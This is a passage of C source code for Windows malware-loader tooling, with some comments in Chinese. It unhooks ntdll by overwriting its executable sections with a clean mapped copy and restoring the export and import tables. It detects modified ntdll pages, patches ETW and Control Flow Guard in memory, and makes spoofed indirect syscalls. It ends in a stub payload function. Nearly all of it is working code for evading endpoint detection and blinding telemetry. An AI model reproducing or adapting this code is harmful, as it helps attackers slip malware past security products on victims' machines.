            if (!ProtectAndCopyRange(pVxTable, pGadgetInRegion1, pRegion2Base, pClean2Base, region2Size)) {
                //ERR("[-]Protect/copy failed on exec section %u (region2)", i);
                goto Cleanup;
            }
            bFixedAnything = TRUE;
            continue;
        }

        PVOID pOutsideGadget = FindSyscallGadgetInModuleOutsideRange(pTargetBase, dirtyStart, dirtyEnd);
        if (!pOutsideGadget) {
            //ERR("[-]No usable syscall gadget outside exec section %u", i);
            goto Cleanup;
        }

        if (!ProtectAndCopyRange(pVxTable, pOutsideGadget, pDirtyStart, pCleanStart, sectionSize)) {
            //ERR("[-]Protect/copy failed on exec section %u (fallback)", i);
            goto Cleanup;
        }

        bFixedAnything = TRUE;
    }

    if (!RestoreExportDirectory(pVxTable, pModuleGadget, pTargetBase, pTargetNt, targetImageSize, pCleanDll, pCleanNt, cleanImageSize)) {
        //ERR("[-]Failed to restore export directory");
        goto Cleanup;
    }
    bFixedAnything = TRUE;

    if (!RestoreImportAddressTable(pVxTable, pModuleGadget, pTargetBase, pTargetNt, targetImageSize)) {
        //ERR("[-]Failed to restore import address table");
        goto Cleanup;
    }
    bFixedAnything = TRUE;

    bSuccess = bFixedAnything;

Cleanup:
    if (bSyscallInstSwapped) {
        pVxTable->NtProtectVirtualMemory.pSyscallInst = pOriginalSyscallInst;
    }
    if (hSection) {
        InvokeSpoofedSyscall(&pVxTable->NtClose, 1, hSection);
    }
    if (bMapped && pCleanDll) {
        InvokeSpoofedSyscall(&pVxTable->NtUnmapViewOfSection, 2, (HANDLE)-1, pCleanDll);
    }
    return bSuccess;
}
BOOL IsNtdllTainted(PVX_TABLE pVxTable) {
    if (!g_ntdllBase) return TRUE; 
    PVOID pTextBase = NULL;
    SIZE_T sTextSize = 0;
    if (!GetTextSectionRange(g_ntdllBase, &pTextBase, &sTextSize)) return TRUE;

    PBYTE pCurrent = (PBYTE)pTextBase;
    PBYTE pEnd = pCurrent + sTextSize;
    
    NTSTATUS status;
    MEMORY_WORKING_SET_EX_INFORMATION memExInfo;

    while (pCurrent < pEnd) {
        memExInfo.VirtualAddress = pCurrent;
        memExInfo.VirtualAttributes.Flags = 0;
        status = InvokeSpoofedSyscall(&pVxTable->NtQueryVirtualMemory, 6,
            (HANDLE)-1,
            pCurrent,
            MemoryWorkingSetExInformation,
            &memExInfo,
            sizeof(memExInfo),
            NULL
        );
        if (NT_SUCCESS(status)) {
            if (memExInfo.VirtualAttributes.Valid && !memExInfo.VirtualAttributes.Shared) {
                //LOG("Found Dirty Page at: %p", pCurrent);
                return TRUE;
            }
        }
        pCurrent += 0x1000;
    }
    return FALSE;
}

BOOL PatchEtw(PVX_TABLE pVxTable) {
    if (!g_ntdllBase) return FALSE;
    PVOID pEtwEventWriteFull = GetProcAddressByName(g_ntdllBase, HASH_EtwEventWriteFull);
    if (!pEtwEventWriteFull) return FALSE;
    // 2. 搜索 call 指令 (Opcode: 0xE8)
    PBYTE pSearch = (PBYTE)pEtwEventWriteFull;
    PVOID pTargetFunc = NULL;
    for (int i = 0; i < 64; i++) {
        if (pSearch[i] == 0xE8) {
            LONG offset = *(PLONG)(pSearch + i + 1);
            pTargetFunc = (PVOID)(pSearch + i + 5 + offset);
            break;
        }
    }
    if (!pTargetFunc) return FALSE;
    BYTE patchBytes[] = { 0x33, 0xC0, 0xC3 }; 
    
    PVOID pBaseAddress = pTargetFunc;
    SIZE_T sSize = sizeof(patchBytes);
    ULONG ulOldProtect = 0;
    NTSTATUS status = InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
        (HANDLE)-1, &pBaseAddress, &sSize, PAGE_READWRITE, &ulOldProtect);
    if (!NT_SUCCESS(status)) return FALSE;

    VxMoveMemory(pTargetFunc, patchBytes, sizeof(patchBytes));
    InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
        (HANDLE)-1, &pBaseAddress, &sSize, ulOldProtect, &ulOldProtect);
    return TRUE;
}

BOOL PatchCFG(PVX_TABLE pVxTable) {
    if (!g_ntdllBase) return FALSE;
    PVOID pTextBase = NULL;
    SIZE_T sTextSize = 0;
    if (!GetTextSectionRange(g_ntdllBase, &pTextBase, &sTextSize)) return FALSE;

    // 2. 特征码扫描
    // 特征: push rax (0x50); sub rsp, 80h (0x48 0x83 0xEC 0x80)
    BYTE signature[] = { 0x50, 0x48, 0x83, 0xEC, 0x80 };
    PBYTE pScan = (PBYTE)pTextBase;
    PVOID pTargetFunc = NULL;
    if (sTextSize < sizeof(signature)) return FALSE;
    for (SIZE_T i = 0; i + sizeof(signature) <= sTextSize; i++) {
        if (memcmp(pScan + i, signature, sizeof(signature)) == 0) {
            pTargetFunc = pScan + i;
            break; 
        }
    }
    if (!pTargetFunc) return FALSE;
    BYTE patchBytes[] = { 0xFF, 0xE0 }; 

    PVOID pBaseAddress = pTargetFunc;
    SIZE_T sSize = sizeof(patchBytes);
    ULONG ulOldProtect = 0;
    NTSTATUS status = InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
        (HANDLE)-1, &pBaseAddress, &sSize, PAGE_READWRITE, &ulOldProtect);

    if (!NT_SUCCESS(status)) return FALSE;
    VxMoveMemory(pTargetFunc, patchBytes, sizeof(patchBytes));
    InvokeSpoofedSyscall(&pVxTable->NtProtectVirtualMemory, 5,
        (HANDLE)-1, &pBaseAddress, &sSize, ulOldProtect, &ulOldProtect);
    return TRUE;
}

BOOL Payload() {
    InvokeSpoofedApi(djb2((PBYTE)"Sleep"), 1, -600000000LL);
    return TRUE;
}
